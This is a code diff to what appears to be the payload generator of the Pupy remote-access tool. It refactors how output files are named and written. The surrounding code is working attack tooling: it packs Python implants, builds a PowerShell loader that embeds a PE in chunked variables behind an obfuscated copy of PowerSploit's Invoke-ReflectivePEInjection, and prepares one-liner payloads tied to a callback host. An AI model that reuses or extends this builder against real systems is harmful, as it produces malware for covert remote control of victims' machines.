@@ -471,7 +471,7 @@ def pupygen(args, config):
         if not outpath:
             template, ext = filename.rsplit('.', 1)
             outfile = tempfile.NamedTemporaryFile(
-                dir=args.output_dir,
+                dir=args.output_dir or '.',
                 prefix=template+'.',
                 suffix='.'+ext,
                 delete=False
@@ -490,12 +490,24 @@ def pupygen(args, config):
     elif args.format=="py" or args.format=="pyinst":
         linux_modules = ""
         if not outpath:
-            outpath="payload.py"
+            outfile = tempfile.NamedTemporaryFile(
+                dir=args.output_dir or '.',
+                prefix='pupy',
+                suffix='.py',
+                delete=False
+            )
+        else:
+            outfile = open(outpath, 'w+b')
+
         if args.format=="pyinst" :
             linux_modules = getLinuxImportedModules()
         packed_payload=pack_py_payload(get_raw_conf(conf))
-        with open(outpath, 'wb') as w:
-            w.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
+
+        outfile.write("#!/usr/bin/env python\n# -*- coding: UTF8 -*-\n"+linux_modules+"\n"+packed_payload)
+        outfile.close()
+
+        outpath = outfile.name
+
     elif args.format=="py_oneliner":
         packed_payload=pack_py_payload(get_raw_conf(conf))
         i=conf["launcher_args"].index("--host")+1
@@ -505,7 +517,17 @@ def pupygen(args, config):
         SPLIT_SIZE = 100000
         x64InitCode, x86InitCode, x64ConcatCode, x86ConcatCode = "", "", "", ""
         if not outpath:
-            outpath="payload.ps1"
+            outfile = tempfile.NamedTemporaryFile(
+                dir=args.output_dir or '.',
+                prefix='pupy',
+                suffix='.ps1',
+                delete=False
+            )
+        else:
+            outfile = open(outpath, 'w+b')
+
+        outpath = outfile.name
+
         code = """
         $PEBytes = ""
         if ([IntPtr]::size -eq 4){{
@@ -531,8 +553,8 @@ def pupygen(args, config):
             x64ConcatCode += "$PEBytes{0}+".format(i)
         print(ok+"X64 dll loaded and {0} variables used".format(i+1))
         script = obfuscatePowershellScript(open(os.path.join(ROOT, "external", "PowerSploit", "CodeExecution", "Invoke-ReflectivePEInjection.ps1"), 'r').read())
-        with open(outpath, 'wb') as w:
-            w.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
+        outfile.write("{0}\n{1}".format(script, code.format(x86InitCode, x86ConcatCode[:-1], x64InitCode, x64ConcatCode[:-1]) ))
+        outfile.close()
     elif args.format=="ps1_oneliner":
         from pupylib.payloads.ps1_oneliner import serve_ps1_payload
         link_ip=conf["launcher_args"][conf["launcher_args"].index("--host")+1].split(":",1)[0]
